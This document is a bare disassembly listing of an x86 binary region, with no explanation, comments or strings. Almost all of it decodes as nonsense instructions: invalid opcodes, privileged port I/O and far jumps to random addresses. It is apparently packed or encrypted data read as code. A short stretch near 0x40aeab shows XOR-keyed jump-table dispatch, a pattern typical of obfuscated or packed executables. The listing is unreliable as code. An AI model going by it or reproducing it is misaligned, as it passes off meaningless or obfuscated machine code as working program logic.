  40a9c0:	mov    edx,0x387432d1
  40a9c5:	push   0x669785f2
  40a9ca:	pop    eax
  40a9cb:	mov    bl,0x4
  40a9cd:	aaa    
  40a9ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9cf:	mov    dh,0x9d
  40a9d1:	push   eax
  40a9d2:	shr    DWORD PTR [edi],1
  40a9d4:	jmp    0xabd01048
  40a9d9:	test   DWORD PTR [esi],eax
  40a9db:	mov    edi,0xc60fef8b
  40a9e0:	icebp  
  40a9e1:	ret    
  40a9e2:	or     cl,BYTE PTR [ebp-0x9]
  40a9e5:	add    DWORD PTR [esi-0x108ef93c],eax
  40a9eb:	(bad)  
  40a9ed:	adc    al,0x2b
  40a9ef:	inc    ebx
  40a9f0:	lods   eax,DWORD PTR ds:[esi]
  40a9f1:	mov    esp,0x7f7579eb
  40a9f6:	xlat   BYTE PTR ds:[ebx]
  40a9f7:	bound  edx,QWORD PTR [ecx]
  40a9f9:	aam    0xf4
  40a9fb:	pop    ebx
  40a9fc:	popf   
  40a9fd:	sub    BYTE PTR [ebp+0x46],dh
  40aa00:	cwde   
  40aa01:	or     DWORD PTR [edx-0x29],ebx
  40aa04:	shl    DWORD PTR [eax+0x70],1
  40aa07:	inc    eax
  40aa08:	dec    edx
  40aa09:	(bad)  
  40aa0a:	mov    al,ds:0xa2137295
  40aa0f:	outs   dx,BYTE PTR ds:[esi]
  40aa10:	(bad)  
  40aa11:	nop
  40aa12:	out    dx,al
  40aa13:	jns    0x40aa67
  40aa15:	adc    al,0x98
  40aa17:	enter  0x4750,0x93
  40aa1b:	loop   0x40aa37
  40aa1d:	fdiv   DWORD PTR [esi+edi*4]
  40aa20:	in     eax,dx
  40aa21:	jmp    DWORD PTR [ebx-0xe]
  40aa24:	cmovne esp,DWORD PTR [esi+0x9]
  40aa28:	sbb    eax,0xd5ce365
  40aa2d:	inc    edx
  40aa2e:	cmp    al,0x90
  40aa30:	mov    ch,0xd4
  40aa32:	add    bh,BYTE PTR ds:0x73731730
  40aa38:	cmp    cl,BYTE PTR [esi+0x33]
  40aa3b:	push   ss
  40aa3c:	test   al,0x40
  40aa3e:	in     eax,dx
  40aa3f:	or     eax,0x949700f1
  40aa44:	cdq    
  40aa45:	mov    ds:0x1a9764ae,al
  40aa4a:	mov    dh,0x7a
  40aa4c:	xchg   BYTE PTR [ebx-0x4],dh
  40aa4f:	int3   
  40aa50:	int3   
  40aa51:	gs pop ecx
  40aa53:	call   0x5ade7e3b
  40aa58:	dec    ecx
  40aa59:	in     al,0x8
  40aa5b:	add    DWORD PTR [esp+ecx*2-0x2e],ecx
  40aa5f:	fst    DWORD PTR [edi+0x4633b93b]
  40aa65:	fisttp DWORD PTR [ecx+ebx*8-0x58c659b6]
  40aa6c:	mov    al,BYTE PTR [ebp-0x17]
  40aa6f:	repnz inc ebx
  40aa71:	mov    esp,0x7cdf0aa4
  40aa76:	sbb    DWORD PTR [eax-0x2b5a40de],esi
  40aa7c:	js     0x40aa0d
  40aa7e:	mov    WORD PTR [esi],es
  40aa80:	inc    ecx
  40aa81:	sub    al,0xd9
  40aa83:	push   ds
  40aa84:	cld    
  40aa85:	pop    eax
  40aa86:	std    
  40aa87:	jp     0x40aae0
  40aa89:	lahf   
  40aa8a:	test   DWORD PTR [edi+edx*4],esp
  40aa8d:	dec    ebp
  40aa8e:	xor    al,0xb3
  40aa90:	sbb    DWORD PTR [eax-0x2e],0x81585539
  40aa97:	retf   0xae66
  40aa9a:	mov    db0,edx
  40aa9d:	dec    esi
  40aa9e:	xor    al,0x38
  40aaa0:	stc    
  40aaa1:	les    ebx,FWORD PTR [ebp+0x717cf428]
  40aaa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaa8:	fwait
  40aaa9:	call   0xd3d6aca1
  40aaae:	xchg   esi,eax
  40aaaf:	mov    ch,BYTE PTR [ebp-0x59]
  40aab2:	daa    
  40aab3:	hlt    
  40aab4:	ficom  WORD PTR [ebx+0x37]
  40aab7:	jl     0x40aaab
  40aab9:	out    0x69,eax
  40aabb:	jns    0x40aadd
  40aabd:	int3   
  40aabe:	xchg   edi,eax
  40aabf:	xor    DWORD PTR [eax+0x31086ae0],ebp
  40aac5:	call   0x55013843
  40aaca:	sbb    esp,eax
  40aacc:	and    DWORD PTR [ecx+0x354246ac],esi
  40aad2:	push   edx
  40aad3:	sbb    ecx,0x61
  40aad6:	inc    edx
  40aad7:	inc    ebp
  40aad8:	pop    ds
  40aad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aada:	pushf  
  40aadb:	fidivr WORD PTR [eax-0x54267079]
  40aae1:	jmp    0x40ab52
  40aae3:	dec    ebx
  40aae4:	scas   al,BYTE PTR es:[edi]
  40aae5:	call   0xf253cf2e
  40aaea:	mov    dh,0xd1
  40aaec:	mov    edi,0xb2a2f45e
  40aaf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaf2:	js     0x40aadf
  40aaf4:	sub    ebx,DWORD PTR [edx-0x511f2cee]
  40aafa:	cmp    DWORD PTR [ebp-0x217bd0bd],edx
  40ab00:	push   cs
  40ab01:	retf   
  40ab02:	out    dx,eax
  40ab03:	les    ebp,FWORD PTR [ebx-0x144aea69]
  40ab09:	int    0xa
  40ab0b:	xchg   BYTE PTR [edx-0x59c25e7c],cl
  40ab11:	sbb    bl,BYTE PTR [esi+0xd]
  40ab14:	xor    al,0x71
  40ab16:	xchg   BYTE PTR [esi],ch
  40ab18:	test   ecx,esi
  40ab1a:	imul   ebp,edx,0x55b0117c
  40ab20:	dec    BYTE PTR [edi+0x2fd74829]
  40ab26:	push   ebp
  40ab27:	sbb    dh,BYTE PTR [eax+ecx*1-0x674f61b2]
  40ab2e:	fwait
  40ab2f:	and    al,0xe8
  40ab31:	lods   al,BYTE PTR ds:[esi]
  40ab32:	add    al,0x7e
  40ab34:	retf   0xc6fa
  40ab37:	test   al,0xc1
  40ab39:	clc    
  40ab3a:	popf   
  40ab3b:	rol    DWORD PTR [ebp-0x7b],cl
  40ab3e:	out    dx,al
  40ab3f:	adc    bl,BYTE PTR [edx-0x63]
  40ab42:	loopne 0x40aafe
  40ab44:	repnz or eax,0x2a88f18a
  40ab4a:	jmp    0x1cfc:0xc21bdab
  40ab51:	push   cs
  40ab52:	rcl    BYTE PTR [ebx-0x59],1
  40ab55:	cmc    
  40ab56:	lods   al,BYTE PTR ds:[esi]
  40ab57:	and    esi,DWORD PTR [eax]
  40ab59:	push   ebx
  40ab5a:	pop    esp
  40ab5b:	adc    DWORD PTR [ebx+0x2ce62a0e],esp
  40ab61:	mov    cl,0xa1
  40ab63:	push   ds
  40ab64:	loopne 0x40ab9d
  40ab66:	push   0x11
  40ab68:	(bad)  
  40ab69:	jnp    0x40abb2
  40ab6b:	mov    ebp,0xaa79bfa9
  40ab70:	fmul   QWORD PTR [edi]
  40ab72:	cmp    eax,0x4cc789bd
  40ab77:	pop    eax
  40ab78:	bound  ebx,QWORD PTR [eax]
  40ab7a:	jb     0x40abf4
  40ab7c:	push   ss
  40ab7d:	les    esp,FWORD PTR [eax-0x12]
  40ab80:	ins    BYTE PTR es:[edi],dx
  40ab81:	cwde   
  40ab82:	pop    ss
  40ab83:	arpl   bp,ax
  40ab85:	push   0x1
  40ab87:	in     al,dx
  40ab88:	cs and esi,ebx
  40ab8b:	xchg   ebp,eax
  40ab8c:	sbb    esi,DWORD PTR [ebx+0x7]
  40ab8f:	add    cl,BYTE PTR [ebp-0x3a5c9b1d]
  40ab95:	aaa    
  40ab96:	xor    eax,0x29763769
  40ab9b:	(bad)  
  40ab9c:	scas   al,BYTE PTR es:[edi]
  40ab9d:	cs pop edi
  40ab9f:	dec    edi
  40aba0:	pop    ecx
  40aba1:	test   BYTE PTR [ebx+0x22],al
  40aba4:	loope  0x40ab32
  40aba6:	ss loop 0x40abf9
  40aba9:	sub    dh,BYTE PTR ds:0xa96d3ce0
  40abaf:	dec    eax
  40abb0:	mov    fs,WORD PTR [edx-0x1d]
  40abb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abb4:	add    eax,0x43234182
  40abb9:	mov    cl,0x45
  40abbb:	in     eax,0xf9
  40abbd:	adc    dl,BYTE PTR [esi]
  40abbf:	xor    edi,DWORD PTR gs:[eax]
  40abc2:	es fcmovne st,st(0)
  40abc5:	imul   edi,DWORD PTR [ecx-0x48],0xffffff8b
  40abc9:	mov    BYTE PTR [edi-0x78762ecc],cl
  40abcf:	lds    esp,FWORD PTR [edi+0x15]
  40abd2:	fsubr  DWORD PTR [ebp+0x2716900c]
  40abd8:	jmp    0xd2d525b3
  40abdd:	push   edi
  40abde:	mov    ebp,0x299d7605
  40abe3:	mov    ah,0xad
  40abe5:	ror    BYTE PTR [edx],0xa3
  40abe8:	rcl    BYTE PTR [edx+0x1dcf9213],cl
  40abee:	xchg   ebx,eax
  40abef:	pop    ecx
  40abf0:	arpl   bp,dx
  40abf2:	ror    BYTE PTR [edx],cl
  40abf4:	shr    dl,0xa6
  40abf7:	add    BYTE PTR [bp+0x2855],al
  40abfc:	loopne 0x40abfb
  40abfe:	cmp    al,0xb6
  40ac00:	(bad)  
  40ac01:	and    bl,dh
  40ac03:	(bad)  
  40ac04:	pop    ebx
  40ac05:	stos   BYTE PTR es:[edi],al
  40ac06:	sar    DWORD PTR [edx+0x4b],cl
  40ac09:	adc    al,0x1d
  40ac0b:	(bad)  
  40ac0d:	pop    eax
  40ac0e:	add    BYTE PTR [ecx-0x40bb4da],ah
  40ac14:	fld    QWORD PTR [ebp+0x12c2f1a0]
  40ac1a:	mov    esp,0x1646c12c
  40ac1f:	cmp    edi,DWORD PTR [edx-0x48e4b58]
  40ac25:	call   0x5e3614a1
  40ac2a:	sbb    al,0x8f
  40ac2c:	mov    es:0x4cb7c344,al
  40ac32:	scas   al,BYTE PTR es:[di]
  40ac34:	ret    
  40ac35:	loop   0x40ac42
  40ac37:	cmp    eax,0xbc14fdeb
  40ac3c:	in     al,dx
  40ac3d:	cmp    bl,BYTE PTR [ebx+0x4d84e318]
  40ac43:	das    
  40ac44:	sbb    eax,0xfa18a2a8
  40ac49:	mov    eax,0xe435201f
  40ac4e:	adc    DWORD PTR [ecx],esi
  40ac50:	and    al,0x5e
  40ac52:	pop    ecx
  40ac53:	pop    ecx
  40ac54:	fwait
  40ac55:	adc    al,0xf3
  40ac57:	or     edx,DWORD PTR [ebp-0x18]
  40ac5a:	and    BYTE PTR [ecx+0x652697ac],ah
  40ac60:	stos   DWORD PTR es:[edi],eax
  40ac61:	xchg   edi,eax
  40ac62:	fst    QWORD PTR [edi]
  40ac64:	das    
  40ac65:	mov    ecx,DWORD PTR [edx-0x59]
  40ac68:	dec    edi
  40ac69:	out    0x73,al
  40ac6b:	ret    
  40ac6c:	aaa    
  40ac6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac6e:	ret    0x8a15
  40ac71:	sbb    ecx,ebx
  40ac73:	leave  
  40ac74:	mov    esi,DWORD PTR [ebp-0x6d19d2b6]
  40ac7a:	inc    eax
  40ac7b:	rcpps  xmm7,XMMWORD PTR [edi+0x6364ec67]
  40ac82:	sbb    al,0x69
  40ac84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac85:	popa   
  40ac86:	ds in  eax,0x90
  40ac89:	jo     0x40ac53
  40ac8b:	push   0xffffffd6
  40ac8d:	mov    bl,0xab
  40ac8f:	push   ebp
  40ac90:	out    0x49,eax
  40ac92:	dec    eax
  40ac93:	(bad)  
  40ac94:	jbe    0x40ac70
  40ac96:	in     eax,dx
  40ac97:	(bad)  
  40ac98:	push   eax
  40ac99:	mov    fs,WORD PTR [ebx]
  40ac9b:	lds    edx,FWORD PTR [ebp+ecx*1+0x341c5b24]
  40aca2:	cdq    
  40aca3:	mov    eax,0x964cf2d2
  40aca8:	hlt    
  40aca9:	cmp    al,0x8b
  40acab:	mul    DWORD PTR [edi]
  40acad:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40acaf:	jbe    0x40ad27
  40acb1:	mov    dh,0xed
  40acb3:	iret   
  40acb4:	sbb    eax,0xb94725d5
  40acb9:	pop    fs
  40acbb:	ins    DWORD PTR es:[edi],dx
  40acbc:	loop   0x40aca7
  40acbe:	cmovs  esi,DWORD PTR [ecx+0x48]
  40acc2:	ins    DWORD PTR es:[edi],dx
  40acc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acc4:	in     al,0xfd
  40acc6:	mov    edx,0x4ed1e2b0
  40accb:	sbb    DWORD PTR [ecx],edx
  40accd:	adc    ebx,edx
  40accf:	jg     0x40ac92
  40acd1:	pop    ebx
  40acd2:	call   0x4ebf:0x5b022848
  40acd9:	call   0x72cb:0xcb4a1e42
  40ace0:	sub    DWORD PTR [eax],0x18
  40ace3:	push   esi
  40ace4:	jle    0x40ad4a
  40ace6:	retf   
  40ace7:	aam    0x83
  40ace9:	adc    bh,BYTE PTR [edx]
  40aceb:	sbb    BYTE PTR [ebp+eiz*1-0x43],al
  40acef:	add    BYTE PTR [edx-0x6ae9eede],0x28
  40acf6:	dec    ecx
  40acf7:	imul   edx,DWORD PTR [ebp-0x6c8e80df],0xf63467fc
  40ad01:	mov    eax,ds:0x5c8323a9
  40ad06:	inc    ebp
  40ad07:	push   cs
  40ad08:	pop    ebp
  40ad09:	std    
  40ad0a:	xlat   BYTE PTR ds:[ebx]
  40ad0b:	jmp    0x5f25:0xc6eb2728
  40ad12:	cmp    BYTE PTR [ebx-0x3e5b40c0],bl
  40ad18:	sub    esp,ebp
  40ad1a:	and    al,0x1c
  40ad1c:	mov    ebp,0x4d83174
  40ad21:	call   0xc78bcf02
  40ad26:	jbe    0x40ad94
  40ad28:	pop    edi
  40ad29:	xchg   DWORD PTR [ecx],edx
  40ad2b:	(bad)  
  40ad2d:	or     BYTE PTR [ecx+0x39a3e169],0x3
  40ad34:	mov    edi,0x6e8d3bc
  40ad39:	repnz fmulp st(3),st
  40ad3c:	ret    0x7bf
  40ad3f:	(bad)  
  40ad41:	sbb    al,0xda
  40ad43:	mov    edx,0x4c1bacbb
  40ad48:	cmp    al,0x3d
  40ad4a:	jl     0x40acf5
  40ad4c:	jl     0x40ad4d
  40ad4e:	ins    BYTE PTR es:[edi],dx
  40ad4f:	xchg   ebp,eax
  40ad50:	jno    0x40adb1
  40ad52:	cmp    BYTE PTR ss:[esi-0x5fadf433],bl
  40ad59:	aam    0xd9
  40ad5b:	pop    ds
  40ad5c:	sbb    esp,DWORD PTR ds:[edx]
  40ad5f:	push   ebx
  40ad60:	in     al,0x7d
  40ad62:	cmc    
  40ad63:	cdq    
  40ad64:	je     0x40add8
  40ad66:	xlat   BYTE PTR ds:[ebx]
  40ad67:	inc    edi
  40ad68:	jmp    0xda73b96e
  40ad6d:	mov    ah,0x38
  40ad6f:	mov    ah,0x88
  40ad71:	xor    DWORD PTR [ebp-0x65],esp
  40ad74:	jp     0x40acf7
  40ad76:	push   esi
  40ad77:	and    eax,DWORD PTR [ecx-0x67]
  40ad7a:	dec    ebx
  40ad7b:	xor    edi,DWORD PTR [eax-0x19]
  40ad7e:	mov    eax,ds:0x8e84586b
  40ad83:	jbe    0x40ad81
  40ad85:	pusha  
  40ad86:	shr    edi,1
  40ad88:	mov    eax,0xdb765d3d
  40ad8d:	aas    
  40ad8e:	sub    eax,0x7b94e313
  40ad93:	cmp    ah,ch
  40ad95:	sub    BYTE PTR [ecx-0x38],cl
  40ad98:	outs   dx,DWORD PTR ds:[esi]
  40ad99:	arpl   dx,ax
  40ad9b:	cmp    edx,ebp
  40ad9d:	lods   al,BYTE PTR ds:[esi]
  40ad9e:	(bad)  
  40ad9f:	lods   eax,DWORD PTR ds:[esi]
  40ada0:	dec    ebx
  40ada1:	dec    eax
  40ada2:	test   BYTE PTR [ebp+0x163c19b],ah
  40ada8:	test   al,0x20
  40adaa:	jno    0x40ae16
  40adac:	inc    ebp
  40adad:	inc    DWORD PTR [ebx-0x65]
  40adb0:	rcr    BYTE PTR [edx],1
  40adb2:	push   ecx
  40adb3:	pop    ss
  40adb4:	cmp    al,0x9e
  40adb6:	dec    edi
  40adb7:	add    eax,0x46
  40adba:	sub    BYTE PTR [edi+ebx*8-0x44],bl
  40adbe:	dec    ebp
  40adbf:	ret    
  40adc0:	ss or  al,0xa8
  40adc3:	js     0x40ae1c
  40adc5:	imul   esp,DWORD PTR [esp+edi*2-0x3f],0x50
  40adca:	not    BYTE PTR [ebx]
  40adcc:	shl    DWORD PTR [edx],1
  40adce:	jmp    0x40ad9c
  40add0:	mov    bh,0x25
  40add2:	adc    al,0xfd
  40add4:	push   ecx
  40add5:	xchg   edx,eax
  40add6:	ror    DWORD PTR [edx],1
  40add8:	rol    DWORD PTR [edi-0x26d6d604],0xa7
  40addf:	js     0x40ad98
  40ade1:	inc    ebx
  40ade2:	xchg   ebx,eax
  40ade3:	cld    
  40ade4:	inc    eax
  40ade5:	std    
  40ade6:	std    
  40ade7:	in     al,0x63
  40ade9:	mov    al,0x40
  40adeb:	call   0x385e032c
  40adf0:	or     al,0xe7
  40adf2:	inc    esp
  40adf3:	xor    BYTE PTR [esi+ebx*4],dh
  40adf6:	fs mov bh,0xe
  40adf9:	mov    ah,0x5e
  40adfb:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adfd:	xchg   ecx,eax
  40adfe:	test   DWORD PTR [edi+ecx*2-0x5a],ecx
  40ae02:	pop    edx
  40ae03:	arpl   di,bp
  40ae05:	mov    ebx,0xb1e79e16
  40ae0a:	adc    BYTE PTR [ebp+0x25632181],cl
  40ae10:	lds    si,DWORD PTR [ebx]
  40ae13:	mov    bh,0x93
  40ae15:	inc    ebx
  40ae16:	rcr    DWORD PTR [ebp-0x54933073],cl
  40ae1c:	cdq    
  40ae1d:	xor    BYTE PTR [eax-0x608f843a],al
  40ae23:	not    DWORD PTR [esi]
  40ae25:	mov    bl,0xf2
  40ae27:	ja     0x40ae6d
  40ae29:	pop    edi
  40ae2a:	ror    dh,0x90
  40ae2d:	push   es
  40ae2e:	frstor [esi+0x49]
  40ae31:	(bad)  
  40ae33:	mov    edi,0xa8e00706
  40ae38:	mov    ecx,0xceebc2fa
  40ae3d:	cmc    
  40ae3e:	xlat   BYTE PTR ds:[ebx]
  40ae3f:	add    BYTE PTR ds:0xde5b6372,al
  40ae45:	inc    edi
  40ae46:	mov    bl,0xe5
  40ae48:	stos   BYTE PTR es:[edi],al
  40ae49:	stc    
  40ae4a:	not    BYTE PTR [ebp-0x7f702dcd]
  40ae50:	pop    ecx
  40ae51:	lock clc 
  40ae53:	loop   0x40ae1f
  40ae55:	iret   
  40ae56:	loope  0x40ae18
  40ae58:	xor    DWORD PTR [eax-0x4f],esi
  40ae5b:	out    dx,al
  40ae5c:	mov    DWORD PTR [edi+ecx*4],esp
  40ae5f:	idiv   DWORD PTR [edi]
  40ae61:	xor    BYTE PTR [edi-0x7a9c7b86],al
  40ae67:	mov    eax,ds:0x998e8e96
  40ae6c:	inc    edi
  40ae6d:	mov    edi,0x3ea3fb6f
  40ae72:	mov    ch,0x7d
  40ae74:	dec    al
  40ae76:	call   0x3c61:0xb1c872b6
  40ae7d:	jbe    0x40aeac
  40ae7f:	sub    DWORD PTR [edx+eiz*1-0x7d8dab14],esp
  40ae86:	mov    al,0xc2
  40ae88:	imul   ecx,esp,0x7d
  40ae8b:	push   0xf
  40ae8d:	sbb    DWORD PTR [esi],0xdf52d99d
  40ae93:	jno    0x40aebf
  40ae95:	cs jno 0x40aed6
  40ae98:	fsub   st(6),st
  40ae9a:	xor    BYTE PTR [edi+0x6dec8659],ah
  40aea0:	pop    esp
  40aea1:	inc    esi
  40aea2:	cmp    DWORD PTR [edi-0x173d7951],ebx
  40aea8:	xor    eax,DWORD PTR [esi]
  40aeaa:	pop    edi
  40aeab:	movzx  eax,WORD PTR [eax+ebx*2]
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx-0x66fe58d0],al
  40aef6:	mov    edi,0x7b0982f2
  40aefb:	jnp    0x40af10
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	std    
  40af01:	jno    0x40aeec
  40af03:	in     al,0xa0
  40af05:	mov    ebx,0x6ab3f7ba
  40af0a:	adc    esp,ebp
  40af0c:	lea    ecx,[ebp-0x5f04158d]
  40af12:	cs pop eax
  40af14:	adc    bh,cl
  40af16:	stc    
  40af17:	imul   edi,DWORD PTR [edi+0x24],0x11e6f2d7
  40af1e:	mov    edx,0x121d4161
  40af23:	jnp    0x40af8a
  40af25:	jmp    0x40aeb7
  40af27:	xor    BYTE PTR [edi+0x66],bh
  40af2a:	clc    
  40af2b:	mov    ?,WORD PTR [esi-0xa]
  40af2e:	shl    ebx,0x9d
  40af31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af32:	cli    
  40af33:	and    al,0x1c
  40af35:	jg     0x40af92
  40af37:	ins    BYTE PTR es:[edi],dx
  40af38:	add    dh,bl
  40af3a:	jns    0x40af9e
  40af3c:	adc    BYTE PTR [esi],al
  40af3e:	fwait
  40af3f:	mov    ecx,0x7b517eed
  40af44:	das    
  40af45:	pop    ds
  40af46:	push   ebp
  40af47:	outs   dx,DWORD PTR ds:[esi]
  40af48:	cmp    eax,0x60e4fa45
  40af4d:	jmp    0xa15f0634
  40af52:	out    dx,eax
  40af53:	mov    esp,0x840ef19c
  40af58:	adc    dh,BYTE PTR [ecx]
  40af5a:	out    dx,eax
  40af5b:	jmp    0x40af76
  40af5d:	icebp  
  40af5e:	xchg   edi,eax
  40af5f:	push   es
  40af60:	mov    DWORD PTR [edx],0x5ae13f63
  40af66:	xor    eax,0x3ae07996
  40af6b:	xchg   esi,eax
  40af6c:	das    
  40af6d:	xor    ebx,DWORD PTR [ebx-0x2a910168]
  40af73:	in     al,dx
  40af74:	into   
  40af75:	mov    esp,0xc934beae
  40af7a:	(bad)  
  40af7b:	popf   
  40af7c:	ficom  DWORD PTR [eax]
  40af7e:	add    al,0x7d
  40af80:	hlt    
  40af81:	scas   al,BYTE PTR es:[edi]
  40af82:	ret    0x2c7c
  40af85:	push   ss
  40af86:	adc    edi,DWORD PTR [edx-0x5b390af5]
  40af8c:	mov    ch,0x7f
  40af8e:	(bad)  
  40af90:	mov    bl,0x5b
  40af92:	cmc    
  40af93:	dec    edx
  40af94:	aaa    
  40af95:	popf   
  40af96:	sbb    eax,0x577ec65
  40af9b:	mov    bl,0xb
  40af9d:	add    eax,0x94493f13
  40afa2:	adc    BYTE PTR [esi+eiz*2+0x37],0x80
  40afa7:	xor    DWORD PTR [ecx-0x6cab0eb5],esi
  40afad:	je     0x40b026
  40afaf:	and    dl,BYTE PTR [ebx]
  40afb1:	fs out dx,al
  40afb3:	addr16 mov ah,0xbb
  40afb6:	shl    bl,0xc2
  40afb9:	loopne 0x40afd2
  40afbb:	adc    BYTE PTR ds:0x2bc4740e,ah
  40afc1:	mov    dl,0xd1
  40afc3:	xchg   edi,eax
  40afc4:	mov    esi,0x42c82a3f
  40afc9:	jmp    0xd3ee:0x5d605f96
  40afd0:	arpl   WORD PTR [esi-0x51],cx
  40afd3:	add    DWORD PTR [ebp+0x7f5e2d2e],esp
  40afd9:	imul   edx,edi,0xa
  40afdc:	fs rcl ah,0x25
  40afe0:	rol    DWORD PTR [edi+0xab6a9db],cl
  40afe6:	sti    
  40afe7:	adc    eax,0x10c9b46a
  40afec:	mov    cl,0x17
  40afee:	mov    al,0x9b
  40aff0:	mov    bl,0x27
  40aff2:	xchg   esp,eax
  40aff3:	push   ecx
  40aff4:	test   DWORD PTR [esi+0x6a],0x697313b6
  40affb:	cmp    BYTE PTR [edi-0x7c420283],bl
  40b001:	out    0xee,eax
  40b003:	in     al,0x56
  40b005:	add    BYTE PTR [edx],ch
  40b007:	js     0x40b031
  40b009:	pop    ss
  40b00a:	ins    DWORD PTR es:[edi],dx
  40b00b:	jp     0x40b080
  40b00d:	xchg   ebx,eax
  40b00e:	retf   0x5581
  40b011:	lock js 0x40b05c
  40b014:	mov    dh,0x99
  40b016:	or     DWORD PTR [esi],esp
  40b018:	repnz cmp eax,0x7685a75c
  40b01e:	inc    edx
  40b01f:	push   0xffffff84
  40b021:	xor    ebx,esp
  40b023:	pop    ebx
  40b024:	mov    ebp,0xc3dc48fc
  40b029:	fdiv   DWORD PTR [ecx-0x40f44d01]
  40b02f:	test   BYTE PTR cs:0x6f65f41e,0x27
  40b037:	mov    DWORD PTR [ebx+0x19e3956b],ebp
  40b03d:	ret    0xf947
  40b040:	shl    BYTE PTR [ebp+ebp*1+0x65],0x57
  40b045:	mov    edi,DWORD PTR [esi]
  40b047:	jb     0x40b006
  40b049:	xchg   ebx,eax
  40b04a:	aas    
  40b04b:	push   0x78e1a662
  40b050:	lahf   
  40b051:	inc    eax
  40b052:	icebp  
  40b053:	add    al,dh
  40b055:	or     al,0xef
  40b057:	loopne 0x40b080
  40b059:	(bad)  
  40b05a:	push   edx
  40b05b:	mov    cl,0x24
  40b05d:	out    0xb3,eax
  40b05f:	test   dl,cl
  40b061:	xchg   edi,eax
  40b062:	sbb    al,0x83
  40b064:	cwde   
  40b065:	std    
  40b066:	cmc    
  40b067:	xchg   edi,ebp
  40b069:	ja     0x40b057
  40b06b:	or     ah,BYTE PTR [esi]
  40b06d:	lods   al,BYTE PTR ds:[esi]
  40b06e:	push   edi
  40b06f:	test   ch,0xaf
  40b072:	fcom   DWORD PTR [edi-0x56]
  40b075:	in     al,0xeb
  40b077:	lahf   
  40b078:	xlat   BYTE PTR ds:[ebx]
  40b079:	inc    esi
  40b07a:	mov    esp,0xc3953f52
  40b07f:	jmp    0x31a4b933
  40b084:	std    
  40b085:	push   edx
  40b086:	cs cdq 
  40b088:	fstp   TBYTE PTR [ecx-0x49df6d3]
  40b08e:	mov    ch,BYTE PTR [ebp+0x111c7350]
  40b094:	push   ebp
  40b095:	dec    eax
  40b096:	push   esi
  40b097:	or     edi,edx
  40b099:	mov    WORD PTR [eax-0x6b664d55],ss
  40b09f:	mov    eax,DWORD PTR [eax]
  40b0a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0a2:	dec    esp
  40b0a3:	fnstenv [eax+0x6a]
  40b0a6:	push   ebp
  40b0a7:	xchg   esp,eax
  40b0a8:	sbb    DWORD PTR [ebx+0x59fe9213],edx
  40b0ae:	ins    DWORD PTR es:[edi],dx
  40b0af:	bound  esp,QWORD PTR [edx-0x7c]
  40b0b2:	xchg   esp,eax
  40b0b3:	adc    cl,BYTE PTR [edi]
  40b0b5:	(bad)  
  40b0b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0b7:	mov    esp,0x6984a718
  40b0bc:	mul    DWORD PTR [edi-0x45]
  40b0bf:	jbe    0x40b12d
  40b0c1:	test   BYTE PTR [eax+0x73],0x9c
  40b0c5:	sub    ebx,DWORD PTR [esi+0x19]
  40b0c8:	inc    ecx
  40b0ca:	jno    0x40b121
  40b0cc:	push   es
  40b0cd:	repz mov edx,0x1eb46ce6
  40b0d3:	int3   
  40b0d4:	leave  
  40b0d5:	das    
  40b0d6:	push   0x654479ca
  40b0db:	test   DWORD PTR [edi],eax
  40b0dd:	and    eax,0x6b709f56
  40b0e2:	and    edi,DWORD PTR [edi+0x49f812e9]
  40b0e8:	out    0x46,eax
  40b0ea:	push   ecx
  40b0eb:	icebp  
  40b0ec:	pop    ss
  40b0ed:	or     bl,BYTE PTR [ebx]
  40b0ef:	das    
  40b0f0:	hlt    
  40b0f1:	stos   DWORD PTR es:[edi],eax
  40b0f2:	sub    dh,BYTE PTR [esi+0x24]
  40b0f5:	mov    ds,WORD PTR [esi-0x5d6cd0fb]
  40b0fb:	addr16 dec edx
  40b0fd:	imul   esp,DWORD PTR [ecx+0x1a6407e6],0x52
  40b104:	mov    eax,0xb0297aa7
  40b109:	mov    cl,0xfc
  40b10b:	mov    bh,0x5e
  40b10d:	jns    0x40b0c2
  40b10f:	repnz cmp eax,DWORD PTR [esi]
  40b112:	pop    es
  40b113:	stos   BYTE PTR es:[edi],al
  40b114:	cwde   
  40b115:	sub    DWORD PTR [edx+0x7eddd4d9],eax
  40b11b:	mov    edx,0x83e75eb9
  40b120:	dec    edi
  40b121:	imul   ebx,esp,0x3c
  40b124:	fxch   st(4)
  40b126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b127:	sub    edi,DWORD PTR [edi+0x1fbbbfa5]
  40b12d:	jne    0x40b13e
  40b12f:	retf   
  40b130:	(bad)  
  40b131:	out    0xb7,eax
  40b133:	or     al,0x48
  40b135:	inc    edi
  40b136:	jno    0x40b19e
